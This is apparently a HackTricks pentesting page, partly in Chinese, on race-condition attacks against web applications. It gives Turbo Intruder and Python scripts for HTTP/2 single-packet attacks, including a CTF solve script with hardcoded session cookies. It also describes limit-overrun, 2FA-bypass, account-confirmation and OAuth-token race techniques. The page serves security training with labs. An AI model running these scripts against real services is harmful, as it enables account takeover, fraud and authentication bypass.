# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> 要深入理解此技术，请查看原始报告 [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Enhancing Race Condition Attacks

利用 race conditions 的主要难点是确保多个请求在同一时间被处理，且它们的处理时间差异非常小——理想情况下小于 1ms。

下面列出了一些用于同步请求的技术：

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: 支持在单个 TCP 连接上发送两个请求，减少网络抖动的影响。但由于服务器端差异，两个请求可能不足以实现稳定的 race condition 利用。
- **HTTP/1.1 'Last-Byte Sync'**: 允许预发送 20-30 个请求的大部分内容，保留一个小片段，然后将这些小片段一起发送，从而实现同时到达服务器。

**Preparation for Last-Byte Sync** 包括：

1. 发送 headers 和 body 数据，但不包含最后一个字节，并且不结束流。
2. 在首次发送后暂停 100ms。
3. 禁用 TCP_NODELAY，以利用 Nagle 的算法来批处理最后的帧。
4. 通过 ping 预热连接。

随后发送被保留的帧应该会导致它们作为单个数据包到达，可通过 Wireshark 验证。该方法不适用于静态文件，静态文件通常不涉及 RC 攻击。

### Adapting to Server Architecture

了解目标的架构至关重要。前端服务器可能会以不同方式路由请求，从而影响时序。通过无害请求进行预先的服务器端连接预热，可能会使请求时序趋于一致。

#### Handling Session-Based Locking

像 PHP 的 session handler 这样的框架会按会话对请求进行序列化，可能会掩盖漏洞。对每个请求使用不同的 session token 可以规避此问题。

#### Overcoming Rate or Resource Limits

如果连接预热无效，通过大量无害请求故意触发 Web 服务器的速率或资源限制延迟，可能会促成 single-packet attack，因为这会在服务器端引入有利于 race condition 的延迟。

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: You can send the request to **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), you can change in the request the value you want to brute force for **`%s`** like in `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` and then select the **`examples/race-single-packer-attack.py`** from the drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

If you are going to **发送不同的值**, you could modify the code with this one that uses a wordlist from the clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> 如果目标网站不支持 HTTP2（仅支持 HTTP1.1），请使用 `Engine.THREADED` 或 `Engine.BURP`，而不要使用 `Engine.BURP2`。

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: 如果你需要先向 1 个 endpoint 发送一个请求，然后向其他多个 endpoint 发送请求以触发 RCE，你可以将 `race-single-packet-attack.py` 脚本修改为类似以下内容：
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- 它也可以在 **Repeater** 中通过 Burp Suite 的新选项 '**Send group in parallel**' 使用。
- 对于 **limit-overrun**，你可以在组中添加 **same request 50 times**。
- 对于 **connection warming**，你可以在 **group** 的 **beginning** 添加一些针对 web 服务器非静态部分的 **requests**。
- 对于在两个 substates 步骤中在处理 **one request and another** 之间进行 **delaying** 的情况，你可以在两个请求之间 **add extra requests between**。
- 对于 **multi-endpoint** RC，你可以先发送那个会进入隐藏状态的 **request**，然后紧接着发送 **50 requests** 来利用该隐藏状态。

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: 该脚本的目标是更改某用户的邮箱，同时持续进行验证，直到新邮箱的验证令牌到达旧邮箱为止（这是因为在代码中出现了一个 RC，可能修改了邮箱但验证发送到了旧邮箱，因为指示邮箱的变量已经被最初的邮箱填充）。\
当在收到的邮件中找到单词 "objetivo" 时，我们就知道已收到被更改邮箱的验证令牌，并结束攻击。
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: 引擎与门控说明

- Engine selection: use `Engine.BURP2` on HTTP/2 targets to trigger the single‑packet attack; fall back to `Engine.THREADED` or `Engine.BURP` for HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: queue many copies with `gate='race1'` (or per‑attempt gates), which withholds the tail of each request; `openGate('race1')` flushes all tails together so they arrive nearly simultaneously.
- Diagnostics: negative timestamps in Turbo Intruder indicate the server responded before the request was fully sent, proving overlap. This is expected in true races.
- Connection warming: send a ping or a few harmless requests first to stabilise timings; optionally disable `TCP_NODELAY` to encourage batching of the final frames.


### 改进 Single Packet Attack

In the original research it's explained that this attack has a limit of 1,500 bytes. However, in [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), it was explained how it's possible to extend the 1,500-byte limitation of the single packet attack to the **65,535 B window limitation of TCP by using IP layer fragmentation** (splitting a single packet into multiple IP packets) and sending them in different order, allowed to prevent reassembling the packet until all the fragments reached the server. This technique allowed the researcher to send 10,000 requests in about 166ms.

请注意，虽然该改进在需要数百/数千个数据包同时到达的 RC 场景中提高了攻击的可靠性，但它可能也受到一些软件限制。像 Apache、Nginx 和 Go 这样的常见 HTTP 服务器对 `SETTINGS_MAX_CONCURRENT_STREAMS` 设置有严格限制，分别为 100、128 和 250。然而，像 NodeJS 和 nghttp2 则没有限制。\
这基本上意味着 Apache 只会将来自单个 TCP 连接的 100 个 HTTP 连接视为并发（从而限制了该 RC 攻击）。

You can find some examples using this tehcnique in the repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Before the previous research these were some payloads used which just tried to send the packets as fast as possible to cause a RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: 将 **request** 发送到 **Intruder**，在 **Options menu** 中将 **number of threads** 设置为 **30**，选择 payload 为 **Null payloads** 并生成 **30**。
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

这是最基本的一类 race condition，出现在那些会限制你执行某个操作次数的地方，会出现 **vulnerabilities**。比如在网店中多次使用同一个折扣码。一个非常简单的例子可以在 [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) 或 [**this bug**](https://hackerone.com/reports/759247)**.**

有许多这类攻击的变种，包括：

- 多次兑换同一礼品卡
- 多次对同一产品评分
- 提取或转账超出账户余额
- 重复使用同一个 CAPTCHA 的解答
- Bypassing an anti-brute-force rate limit

### **Hidden substates**

利用复杂的 race conditions 往往涉及在短暂的时间窗口内利用隐藏或 **unintended machine substates**。下面是一个方法论：

1. **Identify Potential Hidden Substates**
- 从定位那些修改或与关键数据交互的 endpoints（例如 user profiles 或 password reset 流程）开始。重点关注：
- **Storage**：优先选择操作服务器端持久化数据的 endpoints，而不是处理客户端数据的 endpoints。
- **Action**：寻找会更改已有数据的操作，这类操作相比新增数据更可能产生可利用的条件。
- **Keying**：成功的攻击通常涉及基于相同标识符（例如 username 或 reset token）的操作。
2. **Conduct Initial Probing**
- 使用 race condition 测试已识别的 endpoints，观察是否有偏离预期的结果。意外的响应或应用行为变化可能表明存在漏洞。
3. **Demonstrate the Vulnerability**
- 将攻击缩小到利用该漏洞所需的最少请求数，通常只需两个请求。由于时序精确，可能需要多次尝试或使用自动化工具。

### Time Sensitive Attacks

精确控制请求时序可以揭露漏洞，尤其是在安全 token 使用可预测的方法（如基于时间戳）时。例如，基于时间戳生成 password reset tokens 可能导致并发请求时生成相同的 tokens。

**To Exploit:**

- 使用精确的时序（例如 single packet 攻击）发起并发的 password reset 请求。如果生成的 tokens 相同，则表明存在漏洞。

**Example:**

- 同时请求两个 password reset tokens 并比较它们。匹配的 tokens 表明 token 生成存在缺陷。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **to try this.**

## Hidden substates case studies

### Pay & add an Item

查看这个 [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) 了解如何在商店中 **pay** 并 **add an extra** item，使其不会被收费。

### Confirm other emails

思路是 **verify an email address and change it to a different one at the same time**，以判断平台是否会验证已更改的新地址。

### Change email to 2 emails addresses Cookie based

根据 [**this research**](https://portswigger.net/research/smashing-the-state-machine)，Gitlab 曾因这种方式而可被 takeover，因为它可能会 **send** the **email verification token of one email to the other email**。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **to try this.**

### Hidden Database states / Confirmation Bypass

如果使用 **2 different writes** 在 **database** 中 **add** **information**，会存在一小段时间窗口，在该窗口中 **only the first data has been written** 到数据库中。例如，在创建用户时，**username** 和 **password** 可能先被 **written**，随后用于确认新建账户的 **token** 才被写入。这意味着在短时间内用于确认账户的 **token 是 null**。

因此，**registering an account and sending several requests with an empty token** (`token=` or `token[]=` or any other variation) 立即确认该账户，可能允许你在不控制该 email 的情况下 **confirm an account**。

**Check this** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **to try this.**

### Bypass 2FA

下面的 pseudo-code 易受 race condition 影响，因为在创建 session 的极短时间窗口内 **2FA is not enforced**：
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 永久持久化

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). 这些服务允许你创建一个应用并对提供商已注册的用户进行认证。为此，**客户端**需要**允许你的应用**访问其在**OAUth provider**中的部分数据。\
所以，到这里只是常见的使用 google/linkedin/github 等登录，你会看到一个页面提示：“_Application \<InsertCoolName> wants to access you information, do you want to allow it?_”

#### Race Condition in `authorization_code`

问题出现在你**接受它**并自动向恶意应用发送一个 **`authorization_code`** 之后。然后，这个**应用滥用 OAUth service provider 中的 Race Condition，从该 `authorization_code` 为你的账户生成多个 AT/RT**（Authentication Token/Refresh Token）。基本上，它会利用你已允许该应用访问你数据的事实来**创建多个账户**。随后，即使你**停止允许该应用访问你的数据**，会删除一对 AT/RT，但其他的仍然有效。

#### Race Condition in `Refresh Token`

一旦你**获得了一个有效的 RT**，你可以尝试**滥用它来生成多个 AT/RT**，即使用户撤销了对恶意应用的权限，**多个 RT 仍然会保持有效**。

## **RC 在 WebSockets 中**

- 在 [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) 中可以找到一个用 Java 编写的 PoC，用来以**并行**方式发送 websocket 消息，从而滥用 Web Sockets 中的 **Race Conditions**。
- 使用 Burp 的 WebSocket Turbo Intruder 可以使用 **THREADED** 引擎生成多个 WS 连接并并行发送 payloads。以官方示例为起点并调整 `config()`（线程数）以实现并发；在跨 WS 处理程序竞争服务器端状态时，这通常比在单个连接上批量发送更可靠。参见 [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)。

## 参考资料

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
